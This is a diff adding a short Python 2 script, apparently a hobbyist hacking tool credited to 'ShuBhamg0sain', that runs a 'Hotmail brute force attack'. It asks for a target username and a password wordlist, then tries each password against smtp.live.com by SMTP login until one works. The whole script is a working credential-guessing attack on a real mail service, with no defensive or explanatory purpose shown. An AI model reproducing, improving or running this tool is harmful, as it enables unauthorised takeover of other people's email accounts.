@@ -1,0 +1,54 @@
+#!/usr/bin/python
+print('''
+	==================================
+	|      [Hot mail] ==> 3             |
+	|--------------------------------|
+	| Instagram @shubham_g0sain      |
+	| CoDeD By ShuBhamg0sain         |
+	|--------------------------------|
+
+	''')
+import smtplib
+import os
+
+os.system("clear")
+
+smtpserver = smtplib.SMTP("smtp.live.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+import os
+os.system('clear')
+os.system("figlet -f pagga '      hot mail     ' | lolcat")
+os.system("figlet -f pagga ' Brute-Force ' | lolcat")
+os.system("figlet -f pagga '      Attack      ' | lolcat")
+print('''
+	==================================
+	|      [Hotmail] ==>5              |
+	|--------------------------------|
+	| Instagram @shubham_g0sain      |
+	| CoDeD By ShuBhamg0sain         |
+	|--------------------------------|
+
+	''')
+
+print "[!] HotMail Brute Force [!]"
+
+user = raw_input("\nHotMail ussername : ")
+passwfile = raw_input("\n Wordlist : ")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+		try:
+				smtpserver.login(user, password)
+		
+				print "\n[!] Password Found : %s" % password
+				break
+		
+		except smtplib.SMTPAuthenticationError:
+				print "\n[!] Mencoba Password : %s" % password
+
+
+
+
+
+
